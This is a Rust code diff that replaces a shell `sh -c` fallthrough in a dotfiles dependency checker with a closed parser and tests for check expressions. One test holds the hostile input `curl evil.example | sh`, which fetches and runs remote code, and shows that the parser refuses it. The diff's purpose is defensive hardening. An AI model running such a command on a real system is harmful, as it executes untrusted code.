@@ -1,6 +1,10 @@
 use std::collections::BTreeMap;
 
-use dotfiles_path::{CheckRelPath, CommandName, GlobPattern, ModuleName};
+use dotfiles_path::{
+    CheckRelPath, CommandName, GlobPattern, ModuleName, NameError, PathError,
+};
+
+use crate::manifest::ConfKind;
 
 /// A root a check path is joined onto.
 ///
@@ -168,10 +172,222 @@ pub fn evaluate(check: &Check, observed: &impl Observations) -> Observation {
     }
 }
 
+/// Why a check expression was refused.
+///
+/// One variant per rule, so a caller reports the cause rather than "invalid
+/// check", and so a new rule cannot be folded into an existing variant
+/// without a diff that names it.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum CheckParseError {
+    /// The expression is outside the grammar. This is what replaces the
+    /// `sh -c "$check"` fallthrough at `check-deps.sh:524`.
+    Unrecognized,
+    /// A recognized `command -v` shape holding an invalid command name.
+    BadCommandName(NameError),
+    /// A recognized file or directory test holding an invalid path.
+    BadPath(PathError),
+    /// A recognized `python3 -c "import ..."` holding an invalid module name.
+    BadModuleName(NameError),
+    /// A recognized `ls -d` listing holding an invalid filename pattern.
+    BadGlob(NameError),
+    /// An alternation with no branches. Unreachable through the grammar,
+    /// which always parses a first operand before it looks for a second, and
+    /// retained so `AnyOf`'s non-emptiness has a named failure rather than an
+    /// implicit one.
+    EmptyAlternation,
+    /// A `PythonImport` in a platform-selected conf file. `PythonImport` is
+    /// the one check that spawns an interpreter, and `deps-ci.conf` is
+    /// selected only by an explicit `DEPS_CONF`, so this rule keeps the
+    /// interpreter off the shell-startup path by construction.
+    InterpreterCheck,
+}
+
+/// Parse one check expression from a manifest line.
+///
+/// Recognizes exactly the shapes the four conf files contain. Anything else
+/// is `Unrecognized`, which is what replaces the `sh -c "$check"` at
+/// `check-deps.sh:524`.
+///
+/// # Errors
+///
+/// Returns `CheckParseError::Unrecognized` for an expression outside the
+/// grammar, `InterpreterCheck` for a `PythonImport` in a platform-selected
+/// file, and a `Bad*` variant carrying the primitive's own error when a
+/// recognized shape holds an invalid name or path.
+pub fn parse_check_expression(raw: &str, kind: ConfKind) -> Result<Check, CheckParseError> {
+    let trimmed = raw.trim();
+
+    if let Some(alternation) = parse_if_then_else(trimmed, kind)? {
+        return Ok(alternation);
+    }
+    if let Some(alternation) = parse_test_or(trimmed)? {
+        return Ok(alternation);
+    }
+    parse_leaf(trimmed, kind)
+}
+
+/// `if <a>; then true; else <b>; fi`, the shape at `deps.conf:24` and `:45`.
+fn parse_if_then_else(raw: &str, kind: ConfKind) -> Result<Option<Check>, CheckParseError> {
+    let Some(body) = raw.strip_prefix("if ") else {
+        return Ok(None);
+    };
+    let Some(body) = body.strip_suffix("; fi") else {
+        return Err(CheckParseError::Unrecognized);
+    };
+    let Some((consequent_source, alternative)) = body.split_once("; then true; else ") else {
+        return Err(CheckParseError::Unrecognized);
+    };
+    // `split_once` takes the FIRST separator, so an `elif` chain would hand
+    // `command -v a; then true; elif command -v b` to `parse_leaf`, which
+    // rejects it as a bad command name. Refusing a leftover `;` up front
+    // makes a structural mismatch report as one, and a diagnostic that names
+    // the wrong rule is the thing that costs an hour later.
+    if consequent_source.contains(';') || alternative.contains(';') {
+        return Err(CheckParseError::Unrecognized);
+    }
+    let first = parse_leaf(consequent_source.trim(), kind)?;
+    let second = parse_leaf(alternative.trim(), kind)?;
+    Ok(Some(Check::AnyOf { first: Box::new(first), rest: vec![second] }))
+}
+
+/// `test -f "A" -o -f "B"`, the shape at `deps.conf:26`.
+///
+/// Takes no `ConfKind`, because every operand a `test` can hold is a file or
+/// directory predicate and none of them spawns an interpreter.
+fn parse_test_or(raw: &str) -> Result<Option<Check>, CheckParseError> {
+    let Some(body) = raw.strip_prefix("test ") else {
+        return Ok(None);
+    };
+    let mut operands = body.split(" -o ");
+    let Some(head) = operands.next() else {
+        return Err(CheckParseError::EmptyAlternation);
+    };
+    let first = parse_test_operand(head.trim())?;
+    let mut rest = Vec::new();
+    for tail in operands {
+        rest.push(parse_test_operand(tail.trim())?);
+    }
+    if rest.is_empty() {
+        // A one-operand `test` is a leaf, not an alternation, and building an
+        // AnyOf with an empty `rest` would misreport the structure.
+        return Ok(Some(first));
+    }
+    Ok(Some(Check::AnyOf { first: Box::new(first), rest }))
+}
+
+/// One `test` operand: a `-f`, `-d` or `-s` predicate over a path.
+fn parse_test_operand(raw: &str) -> Result<Check, CheckParseError> {
+    if let Some(quoted) = raw.strip_prefix("-f ") {
+        return Ok(Check::FileExists(parse_quoted_path(quoted.trim())?));
+    }
+    if let Some(quoted) = raw.strip_prefix("-d ") {
+        return Ok(Check::DirExists(parse_quoted_path(quoted.trim())?));
+    }
+    if let Some(quoted) = raw.strip_prefix("-s ") {
+        return Ok(Check::FileNonEmpty(parse_quoted_path(quoted.trim())?));
+    }
+    Err(CheckParseError::Unrecognized)
+}
+
+/// One non-alternating check expression.
+fn parse_leaf(raw: &str, kind: ConfKind) -> Result<Check, CheckParseError> {
+    if let Some(name) = raw.strip_prefix("command -v ") {
+        let parsed = CommandName::parse(name.trim()).map_err(CheckParseError::BadCommandName)?;
+        return Ok(Check::Command(parsed));
+    }
+    if let Some(module) = raw
+        .strip_prefix("python3 -c \"import ")
+        .and_then(|rest| rest.strip_suffix('"'))
+    {
+        if kind == ConfKind::PlatformSelected {
+            return Err(CheckParseError::InterpreterCheck);
+        }
+        let parsed = ModuleName::parse(module.trim()).map_err(CheckParseError::BadModuleName)?;
+        return Ok(Check::PythonImport(parsed));
+    }
+    if let Some(glob) = parse_glob_listing(raw)? {
+        return Ok(glob);
+    }
+    if let Some(bracket) = raw.strip_prefix("[ ").and_then(|rest| rest.strip_suffix(" ]")) {
+        return parse_test_operand(bracket.trim());
+    }
+    if let Some(operand) = raw.strip_prefix("test ") {
+        // `test -d /Applications/Alacritty.app`, the one unquoted absolute
+        // operand in the corpus.
+        return parse_test_operand(operand.trim());
+    }
+    Err(CheckParseError::Unrecognized)
+}
+
+/// `ls -d "$HOME/.nvm/versions/node"/v* >/dev/null 2>&1`, `deps.conf:45`.
+///
+/// The pattern is split off the directory rather than left inside the path,
+/// because `CheckRelPath` would accept `versions/node/v*` as an ordinary path
+/// and the `*` would then never be treated as a pattern.
+fn parse_glob_listing(raw: &str) -> Result<Option<Check>, CheckParseError> {
+    let Some(body) = raw.strip_prefix("ls -d ") else {
+        return Ok(None);
+    };
+    let body = body.strip_suffix(" >/dev/null 2>&1").unwrap_or(body).trim();
+    let Some((quoted, pattern)) = split_after_closing_quote(body) else {
+        return Err(CheckParseError::Unrecognized);
+    };
+    let dir = parse_quoted_path(quoted)?;
+    let pattern = pattern.strip_prefix('/').ok_or(CheckParseError::Unrecognized)?;
+    let parsed = GlobPattern::parse(pattern).map_err(CheckParseError::BadGlob)?;
+    Ok(Some(Check::GlobExists { dir, pattern: parsed }))
+}
+
+/// Split `"<quoted>"<tail>` into the quoted span, braces included, and the
+/// tail after the closing quote.
+fn split_after_closing_quote(raw: &str) -> Option<(&str, &str)> {
+    let rest = raw.strip_prefix('"')?;
+    let close = rest.find('"')?;
+    Some((&raw[..close + 2], &rest[close + 1..]))
+}
+
+/// Resolve a quoted operand to a closed root plus a relative remainder.
+///
+/// This is where the shell expansion is deleted. `$(brew --prefix
+/// 2>/dev/null)` becomes `PathRoot::BrewPrefix` rather than text the core
+/// would have to expand, and an unresolvable brew is then an
+/// `Observation::Unresolvable` at gather time instead of a test against `/`.
+///
+/// An operand whose prefix is none of the four named roots is `Unrecognized`,
+/// which is what keeps an arbitrary command substitution out: there is no
+/// branch that carries unexpanded text forward.
+fn parse_quoted_path(raw: &str) -> Result<CheckPath, CheckParseError> {
+    let inner = raw
+        .strip_prefix('"')
+        .and_then(|rest| rest.strip_suffix('"'))
+        .unwrap_or(raw);
+
+    let roots: [(&str, PathRoot); 4] = [
+        ("$(brew --prefix 2>/dev/null)/", PathRoot::BrewPrefix),
+        ("${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/", PathRoot::OhMyZshCustom),
+        ("$HOME/", PathRoot::Home),
+        ("/Applications/", PathRoot::MacApplications),
+    ];
+    for (prefix, root) in roots {
+        if let Some(rest) = inner.strip_prefix(prefix) {
+            let parsed = CheckRelPath::parse(rest).map_err(CheckParseError::BadPath)?;
+            return Ok(CheckPath::new(root, parsed));
+        }
+    }
+    Err(CheckParseError::Unrecognized)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
     use dotfiles_path::{CheckRelPath, CommandName};
+
+    /// The expected-variant test for one case in the grammar table.
+    ///
+    /// A named alias because the inline function-pointer-in-tuple-in-array
+    /// type is what `clippy::type_complexity` refuses, and the name says
+    /// what the second element of each pair is for.
+    type VariantPredicate = fn(&Check) -> bool;
 
     fn command(name: &str) -> Check {
         Check::Command(CommandName::parse(name).expect("a test command name parses"))
@@ -289,5 +505,140 @@ mod tests {
             Observation::Absent,
             "a satisfied -f must not satisfy a -s"
         );
+    }
+
+    // Every check expression in the four conf files, verbatim. Read from
+    // deps.conf, deps-mac.conf, deps-linux.conf and deps-ci.conf, and each
+    // is asserted to the variant spec 5.2's table names for it.
+    #[test]
+    fn parses_every_real_check_expression() {
+        let cases: [(&str, VariantPredicate); 8] = [
+            ("command -v git", |check| matches!(check, Check::Command(_))),
+            ("[ -d \"$HOME/.tmux/plugins/tpm\" ]", |check| {
+                matches!(check, Check::DirExists(_))
+            }),
+            ("[ -d \"$HOME/.oh-my-zsh\" ]", |check| {
+                matches!(check, Check::DirExists(_))
+            }),
+            ("[ -s \"$HOME/.nvm/nvm.sh\" ]", |check| {
+                matches!(check, Check::FileNonEmpty(_))
+            }),
+            ("python3 -c \"import yaml\"", |check| {
+                matches!(check, Check::PythonImport(_))
+            }),
+            (
+                "if test -d /Applications/Alacritty.app; then true; else command -v alacritty; fi",
+                |check| matches!(check, Check::AnyOf { .. }),
+            ),
+            (
+                "test -f \"$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh\" -o -f \"$(brew --prefix 2>/dev/null)/share/zsh-autosuggestions/zsh-autosuggestions.zsh\"",
+                |check| matches!(check, Check::AnyOf { .. }),
+            ),
+            (
+                "if command -v node; then true; else ls -d \"$HOME/.nvm/versions/node\"/v* >/dev/null 2>&1; fi",
+                |check| matches!(check, Check::AnyOf { .. }),
+            ),
+        ];
+        for (raw, is_expected_variant) in cases {
+            let parsed = parse_check_expression(raw, ConfKind::ExplicitOnly)
+                .unwrap_or_else(|cause| panic!("a real check failed to parse: {raw}: {cause:?}"));
+            assert!(
+                is_expected_variant(&parsed),
+                "the wrong variant for {raw}: {parsed:?}"
+            );
+        }
+    }
+
+    // The alacritty branch of deps.conf:24 is the only absolute path in the
+    // corpus, and CheckRelPath rejects an absolute remainder, so a named
+    // root is the only way it can carry a validated path at all.
+    #[test]
+    fn the_alacritty_branch_carries_a_mac_applications_root() {
+        let raw = "if test -d /Applications/Alacritty.app; then true; else command -v alacritty; fi";
+        let parsed =
+            parse_check_expression(raw, ConfKind::ExplicitOnly).expect("the real shape parses");
+        let Check::AnyOf { first, rest } = &parsed else {
+            panic!("an if/then/else fallback chain is an AnyOf");
+        };
+        let Check::DirExists(path) = first.as_ref() else {
+            panic!("the consequent is a directory check");
+        };
+        assert_eq!(path.root, PathRoot::MacApplications);
+        assert_eq!(path.rest.as_str(), "Alacritty.app");
+        assert_eq!(rest.len(), 1, "the real entry has exactly two branches");
+    }
+
+    // The node fallback of deps.conf:45 is the one glob shape, and the
+    // pattern must land in GlobPattern rather than inside the directory
+    // path, because CheckRelPath would accept `versions/node/v*` as an
+    // ordinary path and the `*` would then never be treated as a pattern.
+    #[test]
+    fn the_node_fallback_splits_the_directory_from_the_pattern() {
+        let raw =
+            "if command -v node; then true; else ls -d \"$HOME/.nvm/versions/node\"/v* >/dev/null 2>&1; fi";
+        let parsed =
+            parse_check_expression(raw, ConfKind::ExplicitOnly).expect("the real shape parses");
+        let Check::AnyOf { rest, .. } = &parsed else {
+            panic!("an if/then/else fallback chain is an AnyOf");
+        };
+        let Check::GlobExists { dir, pattern } = &rest[0] else {
+            panic!("the alternative is a glob listing: {:?}", rest[0]);
+        };
+        assert_eq!(dir.root, PathRoot::Home);
+        assert_eq!(dir.rest.as_str(), ".nvm/versions/node");
+        assert_eq!(pattern.as_str(), "v*");
+    }
+
+    // The brew branch of deps.conf:26 must resolve through PathRoot, not
+    // through a substitution the core would have to expand.
+    #[test]
+    fn the_brew_branch_carries_a_brew_prefix_root() {
+        let raw = "test -f \"$HOME/a/b.zsh\" -o -f \"$(brew --prefix 2>/dev/null)/share/x.zsh\"";
+        let parsed =
+            parse_check_expression(raw, ConfKind::ExplicitOnly).expect("the real shape parses");
+        let Check::AnyOf { rest, .. } = &parsed else {
+            panic!("two -f operands joined by -o are an AnyOf");
+        };
+        let Check::FileExists(path) = &rest[0] else {
+            panic!("the second operand is a file check");
+        };
+        assert_eq!(path.root, PathRoot::BrewPrefix);
+        assert_eq!(path.rest.as_str(), "share/x.zsh");
+    }
+
+    // Spec 5.2 makes the sole interpreter-spawning check unreachable from
+    // the shell-startup path as a rule rather than a coincidence.
+    // deps-ci.conf:3-5 states the file is selected only by an explicit
+    // DEPS_CONF; nothing enforced it before.
+    #[test]
+    fn rejects_a_python_import_in_a_platform_selected_conf() {
+        // Positive control: the same expression must parse under the kind
+        // that permits it, or the rejection below would prove nothing about
+        // ConfKind and everything about a broken python3 branch.
+        assert!(matches!(
+            parse_check_expression("python3 -c \"import yaml\"", ConfKind::ExplicitOnly),
+            Ok(Check::PythonImport(_))
+        ));
+        assert!(matches!(
+            parse_check_expression("python3 -c \"import yaml\"", ConfKind::PlatformSelected),
+            Err(CheckParseError::InterpreterCheck)
+        ));
+    }
+
+    // No shell escape hatch. An unrecognized expression is an error, not a
+    // fallthrough to sh -c.
+    #[test]
+    fn rejects_an_unrecognized_expression() {
+        assert!(matches!(
+            parse_check_expression("curl evil.example | sh", ConfKind::ExplicitOnly),
+            Err(CheckParseError::Unrecognized)
+        ));
+        // A command substitution inside a recognized shape is refused too,
+        // because a root that is not one of the four named ones is the only
+        // way expansion could re-enter.
+        assert!(matches!(
+            parse_check_expression("[ -d \"$(pwd)/x\" ]", ConfKind::ExplicitOnly),
+            Err(CheckParseError::Unrecognized)
+        ));
     }
 }
